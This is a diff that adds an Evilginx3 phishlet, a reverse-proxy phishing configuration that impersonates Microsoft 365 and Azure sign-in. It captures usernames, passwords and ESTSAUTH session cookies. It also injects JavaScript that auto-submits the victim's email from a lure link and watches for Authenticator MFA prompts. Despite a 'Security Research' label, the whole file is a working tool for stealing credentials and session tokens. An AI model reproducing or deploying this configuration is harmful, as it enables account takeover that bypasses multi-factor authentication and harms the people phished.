@@ -1,0 +1,87 @@
+# Azure Portal / Microsoft 365 Phishlet for Evilginx3
+# With JS injection for auto-submit and MFA handling
+# Author: Security Research
+
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'azure.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msauth.net', session: false, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'aadcdn', domain: 'msauth.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+auth_tokens:
+  - domain: 'login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie', 'CCState', 'buid', 'esctx', 'x-ms-gateway-slice', 'stsservicecookie']
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT']
+  - domain: '.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
+
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+
+force_post:
+  - path: '/common/login'
+    search:
+      - {key: 'login', search: '.*'}
+      - {key: 'passwd', search: '.*'}
+    force:
+      - {key: 'login', value: '{login}'}
+      - {key: 'passwd', value: '{passwd}'}
+    type: 'post'
+
+# ---- JS Injection Section ----
+js_inject:
+  # Pre-fill and auto-submit the username field when a lure carries the email param
+  - trigger_domains: ['login.microsoftonline.com']
+    trigger_paths: ['/', '/common/login', '/common/oauth2/authorize']
+    trigger_params: ['email']
+    script: |
+      function autofillEmail() {
+        var u = document.querySelector('input[name="loginfmt"]');
+        if (u) {
+          u.value = "{email}";
+          u.dispatchEvent(new Event('input', {bubbles: true}));
+          var next = document.querySelector('input[type="submit"], #idSIButton9');
+          if (next) { next.click(); }
+          return true;
+        }
+        return false;
+      }
+      var t = setInterval(function(){ if (autofillEmail()) clearInterval(t); }, 400);
+
+  # Detect MFA prompt screens and surface status / nudge the victim toward Authenticator approval
+  - trigger_domains: ['login.microsoftonline.com']
+    trigger_paths: ['/common/SAS/ProcessAuth', '/common/SAS/BeginAuth', '/common/login']
+    script: |
+      (function() {
+        function checkMfa() {
+          var body = document.body ? document.body.innerText : "";
+          // Authenticator "approve sign-in" / number-matching screen
+          if (body.indexOf("Approve sign in") !== -1 ||
+              body.indexOf("number shown to sign in") !== -1 ||
+              document.querySelector('#idRichContext_DisplaySign')) {
+            console.log("[MFA] Authenticator push displayed");
+          }
+        }
+        var t = setInterval(checkMfa, 500);
+        setTimeout(function(){ clearInterval(t); }, 60000);
+      })();
